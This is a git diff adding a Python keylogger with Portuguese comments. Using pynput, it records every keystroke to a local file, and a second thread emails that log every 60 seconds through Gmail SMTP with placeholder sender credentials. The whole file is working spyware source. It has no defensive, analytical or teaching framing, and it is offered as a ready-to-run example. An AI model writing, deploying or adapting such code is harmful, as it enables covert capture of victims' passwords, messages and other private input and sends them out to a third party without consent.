@@ -1,0 +1,58 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import time
+
+# Arquivo para salvar as teclas
+log_file = "keylog.txt"
+
+# Função para registrar teclas
+def on_press(key):
+    with open(log_file, "a") as f:
+        f.write(f"{key}\n")
+
+# Enviar e-mail com o log
+def enviar_email():
+    remetente = "seu_email@gmail.com"
+    senha = "sua_senha"
+    destinatario = "destinatario@gmail.com"
+
+    msg = MIMEMultipart()
+    msg['From'] = remetente
+    msg['To'] = destinatario
+    msg['Subject'] = "Keylogger Log"
+
+    with open(log_file, "r") as f:
+        corpo = f.read()
+
+    msg.attach(MIMEText(corpo, 'plain'))
+
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(remetente, senha)
+    texto = msg.as_string()
+    server.sendmail(remetente, destinatario, texto)
+    server.quit()
+
+# Listener de teclas
+def iniciar_keylogger():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+# Enviar log a cada 60 segundos
+def enviar_log_periodicamente():
+    while True:
+        time.sleep(60)
+        enviar_email()
+
+# Exemplo de uso
+if __name__ == "__main__":
+    import threading
+    # Iniciar keylogger em uma thread separada
+    keylogger_thread = threading.Thread(target=iniciar_keylogger)
+    keylogger_thread.start()
+
+    # Enviar logs periodicamente
+    enviar_log_periodicamente()
